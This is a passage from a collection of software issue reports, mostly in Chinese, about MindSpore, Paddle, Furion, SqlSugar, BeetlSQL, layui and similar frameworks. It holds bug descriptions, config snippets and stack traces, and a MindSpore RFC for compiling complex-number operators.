//指定自定义模板路径, 位置：/resources/templates/entity2.java.ftl(或者是.vm) //注意不要带上.ftl(或者是.vm), 会根据使用的模板引擎自动识别 TemplateConfig templateConfig = new TemplateConfig(); templateConfig.setEntity(""/entity.java""); templateConfig.setXml(""/mapper.xml""); //配置自定义模板 ag.setTemplate(templateConfig); // 执行生成 ag.execute(); } }"
通过图算融合实现复数算子编译,"MindSpore整体复数方案包括前端表达和后端生成两部分。 本RFC针对后端生成进行介绍。 前端表达主要修改（其他团队实现中）： 1） 增加数据类型： complex64，complex128. 2） complex64/complex128在前端表示通过虚实交替方式。 3） 增加创建复数tensor接口： ms.complex(real, imag)。 4） 增加虚部和实部取值接口： ms.real(complex), ms.imag(complex) 平台考虑支持GPU和D，未来CPU。 图模式、pynative、numpynative统一规划。 当前阶段，优先GPU + 图模式。 算子优先支持：Add、Sub、Mul、Div、Abs、MatMul、FFT、RFFT等。 在数据layout方面，根据目标平台不同，GPU倾向于使用虚实交替进行complex tensor数据layout。昇腾使用虚实分离方式进行complex tensor数据layout。 整个方案主要包括三部分： 1. 通过Expander将复数算子展开为实数算子 整个展开计算包括3部分：复数转实数， 实数计算，实数转复数。 举例如下： expander之后，变为： 通过expander之后，会引入3个额外的基本算子原语： 1）Real(complex): 提取复数complex的实部Tensor； 2）Imag(complex): 提取复数complex的虚部Tensor； 3）Complex(real, imag): 根据实部tensor和虚部tensor生成复数。 2. 算子融合 对于复数类算子，由于已经expander展开。对于其中的实数部分计算，按照普通的算子融合即可。对于新引入的原语，需要尽量进行融合，包括： 1）Real/Imag与对应输出tensor的消费者op融合； 2）Complex与对应输入tensor的生产者op进行融合。 具体融合pattern后面根据算子能力确定。在特定场景下，Real/Imag/Complex无法参与融合，这时候仍然可能是单算子存在，所以算子编译仍然需要至少支持Real/Imag/Complex单算子编译。 3. 通过分段编译进行复数算子编译生成。 1） Real/Imag：由于输入complex tensor可能为虚实交替或虚实分离排布。为了减少对算子编译及schedule影响，先按照普通tensor编译，然后根据complex tensor的数据排布修正对应输入tensor的index； 2） Complex： 由于输出complex tensor可能为虚实交替或虚实分离排布。为了减少对算子编译及schedule影响，先按照普通tensor编译，然后根据complex tensor的数据排布修正对应输出tensor的index。 4. 其它 除了以上修改点之外，其它需要考虑的修改点包括： 对于未enable_graph_kernel的网络且使用了复数算子，通过pass使能图算level 1 以便复数处理； 对于相邻的expander复数算子， 可能会存在Complex和Imag/Real相邻的情况，这时候可以通过pass直接消除； native依赖整体图算融合的支持。 针对昇腾，如权重等外部complex数据默认为虚实交替layout，考虑到硬件限制，可能需要单独的转换算子。 Trail No. Task Description Assign To 1 Real/Imag/Complex原语支持 gaoxiong 2 复数算子expander zengzitao 3 Complex/Imag/Real分段编译 gaoxiong 4 Complex/Imag/Real融合策略 gaoxiong 5 Complex和Imag/Real消除 zengzitao 6 复数场景自动使能图算融合 zengzitao   <code>: graph(a : complex64, b : complex64) -&gt; complex64 { return Add(a, b) } graph(a : complex64, b : complex64) -&gt; complex64 { # compelx tensor to real tensor Tensor&lt;float32&gt; a_real, a_imag = Real(a), Imag(a) Tensor&lt;float32&gt; b_real, b_imag = Real(b), Imag(b) # compute graph by real tensor real = Add(a_real, b_real) imag = Add(a_imag, b_imag) # real tensor to compelx tensor return Complex(real, imag) }"
Training speed too slow and profiling got stuck,"RCAN model GPU speed performance is ~1152 ms/step for 1P and ~3661 ms/step for 8P, which is way too large compared to PyTorch's 154 ms/step. Training the model with current speed will require up to 20 days. The model definitely needs profiling to track the source of the performance problem. But the profiling do not work as expected. The code used for GPU training and profiling can be found here: https://gitee.com/alex1999_hub/models/tree/rcan/research/cv/RCAN Profiling problem: Trying to perform a profiling results in training got stuck after the 1st step. The code: The StopAtStep class definition was taken from official documentation (https://www.mindspore.cn/mindinsight/docs/en/master/performance_profiling_gpu.html). Exactly the same code was used several times with other models and everything worked fine. / 硬件环境: GPU (RTX 3090 24GB) /device GPU : -- MindSpore version: 1.8.0 -- Python version: Python 3.7.5 -- OS platform and distribution: Linux Ubuntu 18.04.6 -- GCC/Compiler version : - (/): /mode graph Download the updated for GPU code from https://gitee.com/alex1999_hub/models/tree/rcan/research/cv/RCAN Prepare the dataset as described in README. Configure parameter in the file to enable profiling mode. Start the standalone GPU training as descibed in README. The profiling needs to work correctly to track the source of the performance problem. With the training stucks after the 1st step with the following logs: Without profiling () the training works, but the speed is too slow:   <code>: class StopAtStep(ms.Callback): def __init__(self, start_step, stop_step, profiler_dir): super(StopAtStep, self).__init__() self.start_step = start_step self.stop_step = stop_step self.profiler = Profiler(output_path=profiler_dir, start_profile=False) def step_begin(self, run_context): cb_params = run_context.original_args() step_num = cb_params.cur_step_num if step_num == self.start_step: self.profiler.start() def step_end(self, run_context): cb_params = run_context.original_args() step_num = cb_params.cur_step_num if step_num == self.stop_step: self.profiler.stop() def end(self, run_context): self.profiler.analyse() if args.profiling: print(f'Running profiling for 1 epoch with dataset_sink_mode=False') args.dataset_sink_mode = False args.epochs = 1 profiler_dir = './profiler/' profiler_cb = StopAtStep(start_step=10, stop_step=110, profiler_dir=profiler_dir) cb += [profiler_cb] print(f'Starting training on rank {rank_id}') model.train(args.epochs, train_de_dataset, callbacks=cb, dataset_sink_mode=args.dataset_sink_mode) profiling default_config.yaml args.profiling = True Running profiling for 1 epoch with dataset_sink_mode=False [WARNING] ME(56980:140139330434880,MainProcess):2022-08-11-00:50:47.713.128 [mindspore/profiler/profiling.py:1138] For 'Profiler', fail to get RANK_ID from environment, use 0 instead. Starting training on rank 0 [WARNING] ME(56980:140139330434880,MainProcess):2022-08-11-00:50:52.238.551 [mindspore/train/model.py:1097] For StopAtStep callback, {'step_end', 'end', 'step_begin'} methods may not be supported in later version, Use methods prefixed with 'on_train' or 'on_eval' instead when using customized callbacks. {} [WARNING] MD(56980,7f74892d8700,python):2022-08-11-00:53:05.268.979 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:193] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. epoch: 1 step: 1, loss is 64.63230895996094 args.profiling = False Starting training on rank 0 {} [WARNING] MD(21477,7f1a0c799700,python):2022-08-11-01:05:19.604.918 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:193] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. epoch: 1 step: 1, loss is 64.63230895996094 epoch: 1 step: 2, loss is 55.713809967041016 epoch: 1 step: 3, loss is 57.80802536010742 epoch: 1 step: 4, loss is 66.49771881103516 epoch: 1 step: 5, loss is 66.35133361816406 . . ."
【建议】位移InjectionPatterns作为枚举,"Furion 版本号 V2.19.0 原先的枚举可以换成对应的支持位移的枚举由用户自己去组合是否会更好，一方面可以减少原先的枚举数,另一方面可以增加更多的灵活性,程序只需要判断InjectionPatterns.HasFlag(action)而用户只需要自己去组合(InjectionPatterns.Self | InjectionPatterns.FirstInterface)就代表了自己和第一个接口,还可以添加名称匹配的第一个,最后一个等,只需要将匹配的粒度最细的枚举出来就可以了而不需要所有情况都考虑 仅仅只是意见建议   <code>: /// &lt;summary&gt; /// 注册范围 /// &lt;/summary&gt; [SuppressSniffer] [Flags] public enum InjectionPatterns { /// &lt;summary&gt; /// 只注册自己 /// &lt;/summary&gt; [Description(""只注册自己"")] Self=1, /// &lt;summary&gt; /// 第一个接口 /// &lt;/summary&gt; [Description(""只注册第一个接口"")] FirstInterface=1&lt;&lt;1, ///// &lt;summary&gt; ///// 自己和第一个接口，默认值 ///// &lt;/summary&gt; //[Description(""自己和第一个接口"")] //SelfWithFirstInterface, /// &lt;summary&gt; /// 所有接口 /// &lt;/summary&gt; [Description(""所有接口"")] ImplementedInterfaces=1&lt;&lt;2, ///// &lt;summary&gt; ///// 注册自己包括所有接口 ///// &lt;/summary&gt; //[Description(""自己包括所有接口"")] //All } [Injection(Pattern = InjectionPatterns.Self | InjectionPatterns.FirstInterface)]"
ColumnDataType 指定长度问题,"[SugarColumn(ColumnDataType = ""varchar(50)"", ColumnName = ""merchant_id"", Length = 50, IsIgnore = false)] t =&gt; t.merchatId.Equals(param.merchatId) _db.Queryable().WhereIF(whereExpression != null, whereExpression).Select(selectExpression).FirstAsync(); merchantId 通过 ColumnDataType 指定了数据库类型及长度 50 (varchar(50)) Lambda表达式做条件查询的时候为什么长度会变成 string 默认的 4000, 不应该通过实体上的特性自动匹配长度进行创建Sql参数吗?   <code>: /// &lt;summary&gt; /// Desc:商家id /// Default: /// Nullable:True /// &lt;/summary&gt; [SugarColumn(ColumnDataType = ""varchar(50)"", ColumnName = ""merchant_id"")] public string merchantId { get; set; }"
[Ms][NET][pangu][GPU 8p]AttributeError:The 'Dropout' object has no attribute 'dtype',": /device gpu : -- MindSpore version :commit_id:9fa0b784 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_pangu_alpha_gpu_train_8p_0001.py get code from model_zoo sh run_distribute_train_gpu.sh network train failed network train success pangu网络在GPU环境8p训练失败   <code>: [ERROR] PIPELINE(56049,7f0f66be3740,python):2021-08-30-02:33:03.836.416 [mindspore/ccsrc/pipeline/jit/pipeline.cc:807] Compile] # [WARNING] MD(56049,7f0f66be3740,python):2021-08-30-02:33:05.801.642 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:74] ~DeviceQueueOp] preprocess_batch: 0; batch_queue: 0; push_start_time: ; push_end_time: . Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/pangu_alpha/train/test_ms_pangu_alpha_gpu_train_8p_0001/scripts/../train.py"", line 280, in &lt;module&gt; run_train(opt) File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/pangu_alpha/train/test_ms_pangu_alpha_gpu_train_8p_0001/scripts/../train.py"", line 166, in run_train model.train(actual_epoch_num, ds, callbacks=callback, sink_size=args_opt.sink_size, dataset_sink_mode=True) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 677, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 464, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 524, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 390, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 654, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 641, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 523, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 536, in __str__ return self.__repr__() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 546, in __repr__ sub_str += '({}): {}\n'.format(key, repr(value)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 546, in __repr__ sub_str += '({}): {}\n'.format(key, repr(value)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 546, in __repr__ sub_str += '({}): {}\n'.format(key, repr(value)) [Previous line repeated 5 more times] File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 539, in __repr__ extra_str = self.extend_repr() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/pangu_alpha/train/test_ms_pangu_alpha_gpu_train_8p_0001/src/pangu_alpha.py"", line 80, in extend_repr return 'keep_prob={}, dtype={}'.format(self.keep_prob, self.dtype) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 294, in __getattr__ raise AttributeError(""The '{}' object has no attribute '{}'."".format(type(self).__name__, name)) AttributeError: The 'Dropout' object has no attribute 'dtype'."
FetchMany 空指针异常,"@FetchMany 还存在一个空指针问题。如： User-----(1:N)----&gt;Address 执行查询： 当存在： id为10的记录时，能正常Fetch Address数据； 当Id为10的记录不存在时，FetchManyAction则会抛空指针异常，如：   <code>: @FetchMany(""userId"") private List&lt;Address&gt; addresses; sqlManager.single(User.class, 10) org.beetl.sql.clazz.kit.BeetlSQLException: org.beetl.sql.clazz.kit.BeetlSQLException: java.lang.NullPointerException at org.beetl.sql.fetch.DefaultBeanFetch.fetchMore(DefaultBeanFetch.java:60) at org.beetl.sql.core.BaseSQLExecutor.afterBean(BaseSQLExecutor.java:1125) at org.beetl.sql.core.BaseSQLExecutor.single(BaseSQLExecutor.java:449) at org.beetl.sql.core.BaseSQLExecutor.single(BaseSQLExecutor.java:387) at org.beetl.sql.core.SQLManager.single(SQLManager.java:518) at org.beetl.sql.mapper.internal.SingleAMI.call(SingleAMI.java:17)"
给手机APP使用，不使用原来的用户名密码登录，要使用手机号+短信登录,给手机APP使用，不使用原来的用户名密码登录，要使用手机号+短信登录/注册，应该怎么办？ 如果没有注册过，直接注册并登录 如果注册过，直接登录进去 是不是只有改写LoginController.java ？ 2018-12-9更新： 这个文档并没有说明怎么更换成自己的登录接口：http://jeesite4.mydoc.io/?t=270527 真看不出来登录是写在了哪里？ PS：查找了Apache Shiro 1.4官方的文档，也没有找到原始的方法？   <code>: currentUser.login
有没有加载进度指示,"使用了，感觉很好，有个问题自己虽然解决了，还是想请教作者，我用的是ifrmae版，加载页面时，时间比较长，没有个加载进度指示，我的办法是， 1、修改了index.html, 2、修改multitabs.js在357行处增加如下： 这样也可以解决了， 想请教作者，是否有更好的办法，增加这个加载指示   <code>: &lt;main class=""lyear-layout-content""&gt; &lt;div id=""londingdiv"" style=""position: absolute;z-index:9999;width:100%;height:100%;margin-top:44px;""&gt; &lt;p style=""margin-top:100px;margin-left:40%;""&gt;&lt;img alt="""" src=""images/large-loading.gif""&gt;&lt;/p&gt; &lt;/div&gt; &lt;div id=""iframe-content""&gt;&lt;/div&gt; &lt;/main&gt; &lt;!--End 页面主要内容--&gt; $(""#londingdiv"").show(); var iframe = document.getElementById($tabPane.attr('id')); if(iframe.attachEvent){ iframe.attachEvent(""onreadystatechange"", function() { //此事件在内容没有被载入时候也会被触发，所以我们要判断状态 //有时候会比较怪异 readyState状态会跳过 complete 所以我们loaded状态也要判断 if (iframe.readyState === ""complete"" || iframe.readyState == ""loaded"") { //代码能执行到这里说明已经载入成功完毕了 //要清除掉事件 //alert(""complete111""); $(""#londingdiv"").hide(); iframe.detachEvent(""onreadystatechange"", arguments.callee); //这里是回调函数 } }); }else{ iframe.addEventListener(""load"", function() { //代码能执行到这里说明已经载入成功完毕了 //alert(""complete222""); $(""#londingdiv"").hide(); this.removeEventListener(""load"", arguments.call, false); //这里是回调函数 }, false); } $tabPane.attr('src', param.url);"
Redis command timed out; nested exception is io.lettuce.core.RedisCommandTimeoutException: Command timed out after 10 second(s),lettuce的超时问题，是怎么解决的 数据库索引   <code>: database: 0 # 连接超时时间 timeout: 500 lettuce: pool: # 连接池中的最小空闲连接 min-idle: 0 # 连接池中的最大空闲连接 max-idle: 8 # 连接池的最大数据库连接数 max-active: 8 # #连接池最大阻塞等待时间（使用负值表示没有限制） max-wait: -1ms
jsonWebTokenUtil解析jwt会报错什么原因,"在jsonWebTokenUtil里，parseJwtPayload()方法里，解析body的这一行 抛出CompressionException，最终发现这个错误是在Inflater.java的本地方法inflateBytes那里抛出的一个DataFormatException引起的。这个是为什么呢？   <code>: if (compressionCodec != null) { //在这一句会抛出 io.jsonwebtoken.CompressionException:Unable to decompress bytes byte[] decompressed = compressionCodec.decompress(TextCodec.BASE64URL.decode(base64UrlEncodedPayload)); payload = new String(decompressed, io.jsonwebtoken.lang.Strings.UTF_8); } public int inflate(byte[] b, int off, int len) throws DataFormatException { if (b == null) { throw new NullPointerException(); } if (off &lt; 0 || len &lt; 0 || off &gt; b.length - len) { throw new ArrayIndexOutOfBoundsException(); } synchronized (zsRef) { ensureOpen(); int thisLen = this.len; //这里抛出DataFormatException int n = inflateBytes(zsRef.address(), b, off, len); bytesWritten += n; bytesRead += (thisLen - this.len); return n; } }```"
"""use_fast_math"" makes our GPU precision of some op, such as sin, lower than TensorFlow","Paddle的CUDA代码编译默认使用了，这个选项会导致一些计算的精度偏低。 https://github.com/PaddlePaddle/Paddle/blob/de975be1ece292537b7b2f650dc58de5bf500583/cmake/cuda.cmake#L189-L192 我们对比了Paddle、TensorFlow和numpy计算结果的diff，使用如下代码： 使用Paddle develop代码（commit：81fe02c3fec82c5249bd143f96d0f4c98bf247ce）运行结果如下： Paddle GPU： Paddle CPU： TensorFlow GPU： Paddle CPU、TensorFlow GPU与numpy的计算结果，diff都在级别。Paddle GPU与numpy的sin计算结果，diff在级别。 该精度上的diff导致了@xixiaoyao 训练xlnet网络的结果很差。   <code>: --use_fast_math import numpy as np def run_paddle(use_cuda=True): try: import paddle.fluid as fluid if use_cuda: exe = fluid.Executor(fluid.CUDAPlace(0)) else: exe = fluid.Executor(fluid.CPUPlace()) data = fluid.layers.data(name=""input"", shape=[1]) sin = fluid.layers.sin(data) fetchs = exe.run(fluid.default_main_program(), fetch_list=[sin], feed={'input':512}) sin_of_paddle = fetchs[0] sin_of_numpy = np.sin(512) print(""numpy result:"", sin_of_numpy) print(""Paddle result:"", sin_of_paddle) print(""Diff: "", np.abs(sin_of_numpy - sin_of_paddle)) except ImportError: raise Exception(""Cannot import paddle"") def run_tensorflow() : try: import tensorflow as tf s = tf.Session() sin_of_tf = s.run(tf.sin(512.0)) sin_of_numpy = np.sin(512) print(""numpy result:"", sin_of_numpy) print('tensorflow result (gpu):', sin_of_tf) except ImportError: raise Exception(""Cannot import tensorflow"") if __name__ == '__main__': run_paddle(use_cuda=True) run_tensorflow() GPU： ('numpy result:', 0.07951849401287635) ('Paddle result (gpu):', array(0.07953902, dtype=float32)) ('Diff: ', 2.0521876291437757e-05) CPU： ('numpy result:', 0.07951849401287635) ('Paddle result:', array(0.0795185, dtype=float32)) ('Diff: ', 2.9773275095346108e-09) 2019-08-06 06:29:07.860797: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1511] Adding visible gpu devices: 0 2019-08-06 06:29:08.599840: I tensorflow/core/common_runtime/gpu/gpu_device.cc:982] Device interconnect StreamExecutor with strength 1 edge matrix: 2019-08-06 06:29:08.599926: I tensorflow/core/common_runtime/gpu/gpu_device.cc:988] 0 2019-08-06 06:29:08.599940: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1001] 0: N 2019-08-06 06:29:08.601063: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1115] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 14943 MB memory) -&gt; physical GPU (device: 0, name: Tesla V100-SXM2-16GB, pci bus id: 0000:00:0b.0, compute capability: 7.0) ('numpy result:', 0.07951849401287635) ('tensorflow result (gpu):', 0.0795185) ('Diff:', 2.9773275095346108e-09) sin 1.E-9 1.E-5"
dataset: json parse failed when do profiling,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : when turn on profiling, when json file were writed by different thread, it raise json parse error like:   <code>: [json.exception.parse_error.101] parse error at line 1, column 24577, syntax error while parsing array - unexpected end of input; expected ‘]’"
RootServices 导致的 Cannot resolve scoped service 的问题,"Furion 版本号 2.8 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 2.65 版本与2.62版本 的一个改动 【RootServices】 是干什么的，更新之后，IOptionsSnapshot 配置服务解析出问题了。 把RootServices替换成null即可正常读取配置。 异常堆栈是什么？ &lt;s:Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware&gt; System.InvalidOperationException: Cannot resolve scoped service 'Microsoft.Extensions.Options.IOptionsSnapshot1 requirements) at Microsoft.AspNetCore.Authorization.Policy.PolicyEvaluator.AuthorizeAsync(AuthorizationPolicy policy, AuthenticateResult authenticationResult, HttpContext context, Object resource) at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context) at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware.Invoke(HttpContext context) at Microsoft.AspNetCore.ResponseCaching.ResponseCachingMiddleware.Invoke(HttpContext httpContext) at Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware.Invoke(HttpContext context) 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: 1[Ddf.Common.Settings.VarsOptions]' from root provider. at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteValidator.ValidateResolution(Type serviceType, IServiceScope scope, IServiceScope rootScope) at Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceProviderEngine.GetService(Type serviceType, ServiceProviderEngineScope serviceProviderEngineScope) at Furion.App.GetService(Type type, IServiceProvider serviceProvider) in G:\Fork\Furion\framework\Furion\App\App.cs:line 115 at Furion.App.GetService[TService](IServiceProvider serviceProvider) in G:\Fork\Furion\framework\Furion\App\App.cs:line 104 at Furion.App.GetOptionsSnapshot[TOptions](IServiceProvider serviceProvider) in G:\Fork\Furion\framework\Furion\App\App.cs:line 185 at Ddf.Model.Runtime.Static.Options.get_Vars() in D:\duoduofan\src\Ddf\Ddf.Model\Runtimes\Static.cs:line 18 at Ddf.Model.Entities.Main.Tb_User.get_LevelsBenefits() in D:\duoduofan\src\Ddf\Ddf.Model\Entities\Main\Partials\Tb_User.cs:line 38 at Ddf.Model.Dtos.Account.UserDto..ctor(Tb_User user) in D:\duoduofan\src\Ddf\Ddf.Model\Dtos\Account\UserDto.cs:line 28 at Ddf.Web.Api.Handlers.JwtHandler.CheckAuthorzie(AppAuthorizeRequirement requirement, DefaultHttpContext httpContext) in D:\duoduofan\src\Ddf\Ddf.Web.Api\Handlers\JwtHandler.cs:line 87 at Ddf.Web.Api.Handlers.JwtHandler.PipelineAsync(AuthorizationHandlerContext context, DefaultHttpContext httpContext) in D:\duoduofan\src\Ddf\Ddf.Web.Api\Handlers\JwtHandler.cs:line 49 at Furion.Authorization.AppAuthorizeHandler.AuthorizeHandleAsync(AuthorizationHandlerContext context) in G:\Fork\Furion\framework\Furion\Authorization\Handlers\AppAuthorizeHandler.cs:line 79 at Ddf.Web.Api.Handlers.JwtHandler.HandleAsync(AuthorizationHandlerContext context) in D:\duoduofan\src\Ddf\Ddf.Web.Api\Handlers\JwtHandler.cs:line 34 at Microsoft.AspNetCore.Authorization.DefaultAuthorizationService.AuthorizeAsync(ClaimsPrincipal user, Object resource, IEnumerable"
如何把父页面选择的表格数据在子页面渲染表格，获取到数据但表格一直转圈,"父页面 经过测试，已经获取到选择的数据，父页面执行子页面的iframe.child（） 子页面代码 子页面通过后台打印，能够获取到数据，但是用数据datas渲染表格，表格却一直转圈圈。   <code>: var json; //头工具栏事件 table.on('toolbar(IO-table)', function(obj){ var checkStatus = table.checkStatus(obj.config.id); switch(obj.event){ case 'Out': var data = checkStatus.data; var IDS = getRowFexId(""IO_Id"",obj.config.id); if (IDS === """" ) { layer.tips('请至少选择1个', this, {tips: [1, '#5FB878']}) } else { //这行是监听到的表格行数据信息，复制给json全局变量。 json = JSON.stringify(data); //layer.alert(json, {title: '当前行数据：'}); layer.open({ type: 2 , title: ""更新"" , content: 'Admin_Out_Product.asp?action=Add&amp;IO_Id='+IDS , area: ['500px', '500px'] , btn: ['确定', '取消'] , yes: function (index, layero) { //layero.find('iframe')[0].contentWindow.formData(); }, success: function (layero, index) { // 获取子页面的iframe var iframe = window[layero.find('iframe')[0]['name']]; //得到iframe页的窗口对象，执行iframe页的方法：iframeWin.method(); var obj = {""selectData"": data}; iframe.child(obj); } }); } break; }; }); var parentData=""""; var datas=""""; function child(obj){ parentData=obj; datas = parentData.selectData; //console.log(datas); layui.use(['element','dropdown','layer','table','laydate','form','jquery'], function(){ var table = layui.table; var laydate = layui.laydate; var form = layui.form; var layer = layui.layer; var dropdown = layui.dropdown; var element = layui.element; //var util = layui.util; $ = layui.jquery; laydate.render({ elem: '#IO_In_Time' ,format: 'yyyy-M-d' ,showBottom: false }); console.log(datas); //第一个实例 table.render({ elem: '#Out_table' ,id: 'Out_table' ,size: 'sm' //小尺寸 ,title: '原材料入库记录' ,data: datas ,cols: [[ {type:'checkbox', fixed: 'left', width:50} ,{field: 'IO_ClassId', title: '小类'} ,{field: 'IO_Model', title: '名称型号', width:180} ,{field: 'IO_TodayNumber', title: '库存量', width:80} ,{field: 'IO_Unit', title: '单位', width:50} ]] }); }); };"
"【MindStudio提出】RuntimeError: Launch kernel failed, name:Default/UniformInt-op0","Transformer网络训练失败，报RuntimeError: Launch kernel failed, name:Default/UniformInt-op0 / 硬件环境: /device GPU : -- MindSpore version :mindspore1.8.1 -- Python version :Python 3.7.5 -- OS platform and distribution :Ubuntu 18.04 -- GCC/Compiler version : gcc7.5.0 (/): /mode pynative python3 run_mlm_no_trainer.py --model_type xlm --config_name /home/lijinxin/model_projects/huggingface_data/xlm-roberta-base --train_file /home/lijinxin/dataset/wikitext-103-raw/wiki.train.txt --max_seq_length 512 --output_dir /home/lijinxin/temp --tokenizer_name /home/lijinxin/model_projects/huggingface_data/xlm-roberta-base --per_device_train_batch_size 1 运行模型transformer模型，断点到mindspore.ops.UniformInt() 查看mindspore.ops.UniformInt()算子输入 result = mindspore.ops.UniformInt()(size, minval, maxval) (Pdb) size (1, 512) (Pdb) minval Tensor(shape=[], dtype=Int32, value= 0) (Pdb) maxval Tensor(shape=[], dtype=Int32, value= 250002) (Pdb) 执行算子报错 (Pdb) result = mindspore.ops.UniformInt()(size, minval, maxval) [ERROR] KERNEL(24842,7f9dcb4d3740,python):2022-08-16-16:36:41.234.192 [mindspore/ccsrc/plugin/device/gpu/kernel/math/random_op_gpu_kernel.h:118] Launch] For '', should be strictly less than [ERROR] DEVICE(24842,7f9dcb4d3740,python):2022-08-16-16:36:41.234.234 [mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:601] LaunchKernel] Launch kernel failed, kernel full name: Default/UniformInt-op0 *** RuntimeError: Launch kernel failed, name:Default/UniformInt-op0 C++ Call Stack: (For framework developers) mindspore/ccsrc/runtime/pynative/run_op_helper.cc:481 LaunchKernels mindspore.ops.UniformInt()算子不报错 Traceback (most recent call last): File ""/home/lijinxin/temp/transformers_x2ms/examples/pytorch/language-modeling/run_mlm_no_trainer.py"", line 748, in main() File ""/home/lijinxin/temp/transformers_x2ms/examples/pytorch/language-modeling/run_mlm_no_trainer.py"", line 653, in main for step, batch in enumerate(train_dataloader): File ""/home/lijinxin/temp/transformers_x2ms/x2ms_adapter/datasets.py"", line 385, in iter batch = self.collate_fn(batch) File ""/home/lijinxin/temp/transformers_x2ms/src/transformers/data/data_collator.py"", line 46, in call return self.torch_call(features) File ""/home/lijinxin/temp/transformers_x2ms/src/transformers/data/data_collator.py"", line 740, in torch_call batch[""input_ids""], special_tokens_mask=special_tokens_mask File ""/home/lijinxin/temp/transformers_x2ms/src/transformers/data/data_collator.py"", line 773, in torch_mask_tokens random_words = x2ms_adapter.randint(len(self.tokenizer), labels.shape, dtype=mindspore.int64) File ""/home/lijinxin/temp/transformers_x2ms/x2ms_adapter/torch_base_api.py"", line 1413, in randint return _randint(kwargs.pop('low', 0), *args, **kwargs) File ""/home/lijinxin/temp/transformers_x2ms/x2ms_adapter/torch_base_api.py"", line 1425, in _randint result = mindspore.ops.UniformInt()(size, minval, maxval) File ""/home/lijinxin/miniconda3/envs/ms1.8/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 294, in call return _run_op(self, self.name, args) File ""/home/lijinxin/miniconda3/envs/ms1.8/lib/python3.7/site-packages/mindspore/common/api.py"", line 98, in wrapper results = fn(*arg, **kwargs) File ""/home/lijinxin/miniconda3/envs/ms1.8/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 748, in _run_op output = real_run_op(obj, op_name, args) RuntimeError: Launch kernel failed, name:Default/UniformInt-op1   <code>: minval maxval"
如何设置filter配置出的搜索样式呢(jssdk),"通过 filter 实现搜索，请问这个该怎么设置他的样式呢？   <code>: ""filter"": { ""title"": null, ""controls"": [ { ""type"": ""text"", ""name"": ""keywords"" } ] }"
"[r1.3][MS][NET][resnet][ascend/gpu]ValueError: The argument in 'kwargs' should be 'loss_scale_manager' or 'keep_batchnorm_fp32', but got 'acc_level'",": /device gpu : -- MindSpore version :commit_id:58619b2bb -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C79/20210916 test_ms_model_zoo_resnet50_cifar10_train_check_loss_8p.py get code from model_zoo sh run_distribute_train.sh network train failed network train success   <code>: Traceback (most recent call last): File ""train.py"", line 401, in &lt;module&gt; train_net() File ""/home/jenkins/workspace/TDT_deployment/solution_test/test_scripts/mindspore/net/resnet50/network/resnet_network/test_ms_model_zoo_resnet50_cifar10_train_check_loss_8p/scripts/train_parallel0/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 362, in train_net eval_network=dist_eval_network) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 142, in __init__ 